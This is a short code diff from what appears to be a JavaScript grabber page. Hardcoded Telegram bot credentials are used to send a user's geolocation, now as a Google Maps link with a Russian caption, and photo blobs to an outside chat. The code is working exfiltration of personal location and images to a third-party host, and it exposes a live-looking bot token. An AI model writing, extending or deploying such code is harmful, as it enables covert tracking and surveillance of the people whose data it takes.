@@ -2,7 +2,8 @@ const botToken = '8377810271:AAG4gGXoBLBCjt3fKE9ZSefJ92UiI_jKW5I';
 const chatId = '8071841674';
 
 function sendLocation(lat, lon) {
-  fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`);
+  const url = `https://www.google.com/maps?q=${lat},${lon}`;
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('Геолокация пользователя: ' + url)}`);
 }
 
 function sendPhoto(blob) {
